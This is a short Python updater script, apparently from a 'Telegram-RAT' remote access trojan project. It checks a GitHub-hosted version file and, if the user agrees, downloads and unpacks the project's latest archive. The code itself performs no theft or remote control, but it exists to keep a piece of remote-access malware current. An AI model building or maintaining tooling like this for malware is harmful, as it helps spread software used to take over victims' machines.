# Import modules

import os
import sys
import time
import shutil
import urllib.request

RAT_Version = urllib.request.urlopen('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/Version/Version.txt').read().decode('utf8').splitlines()[0]
RAT_Changelogs = urllib.request.urlopen('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/Version/Changelogs.txt').read().decode('utf8')
RAT_Link = 'https://github.com/Bainky/Telegram-RAT/archive/master.zip'
RAT_Path = 'Telegram-RAT.zip'

Version = open(os.getcwd() + '\\Version\\Version.txt', 'r')


# Checking version Telegram-RAT

for CurrentVersion in Version:
	if RAT_Version == CurrentVersion:
		print('No available updates')
		input()
	else:
		print('Update available. Update now? y/n')
		print('\nChangelogs:\n' + RAT_Changelogs + '\n')
		if input().lower() == 'y'.lower():
			for Downloading in '\nDownloading update..':
				time.sleep(0.05)
				sys.stdout.write(Downloading)
				sys.stdout.flush()
			urllib.request.urlretrieve(RAT_Link, RAT_Path)

			for Unpacking in '\nUnpacking archive..':
				time.sleep(0.05)
				sys.stdout.write(Unpacking)
				sys.stdout.flush()
			shutil.unpack_archive(RAT_Path, 'Telegram-RAT')
			time.sleep(3)
			print('\nUpdate installed.')
			os.remove(RAT_Path)
			input()
